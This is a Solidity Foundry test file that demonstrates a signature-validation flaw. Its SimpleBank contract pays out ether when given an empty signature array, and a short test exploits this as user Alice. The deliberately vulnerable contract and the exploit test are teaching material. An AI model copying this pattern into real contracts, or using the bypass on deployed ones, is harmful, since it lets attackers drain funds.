pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ContractTest is Test {
    SimpleBank SimpleBankContract;

    function setUp() public {
        SimpleBankContract = new SimpleBank();
    }

    function testVulnSignatureValidation() public {
        _handleTestVulnSignatureValidationHandler();
    }

    function _handleTestVulnSignatureValidationHandler() internal {
        payable(address(SimpleBankContract)).transfer(10 ether);
        address alice = vm.addr(1);
        vm.startPrank(alice);
        SimpleBank.Signature[] memory sigs = new SimpleBank.Signature[](0);
        console.log(
        "Before operation",
        address(alice).balance
        );
        SimpleBankContract.withdraw(sigs);
        console.log(
        "Afer exploiting, Alice's ether balance",
        address(alice).balance
        );
    }

    receive() external payable {}
}

contract SimpleBank {
    struct Signature {
        bytes32 hash;
        uint8 v;
        bytes32 r;
        bytes32 s;
    }

    function verifySignatures(Signature calldata sig) public {
        require(
            msg.sender == ecrecover(sig.hash, sig.v, sig.r, sig.s),
            "Invalid signature"
        );
    }

    function withdraw(Signature[] calldata sigs) public {


        for (uint i = 0; i < sigs.length; i++) {
            Signature calldata signature = sigs[i];

            verifySignatures(signature);
        }
        payable(msg.sender).transfer(1 ether);
    }

    receive() external payable {}
}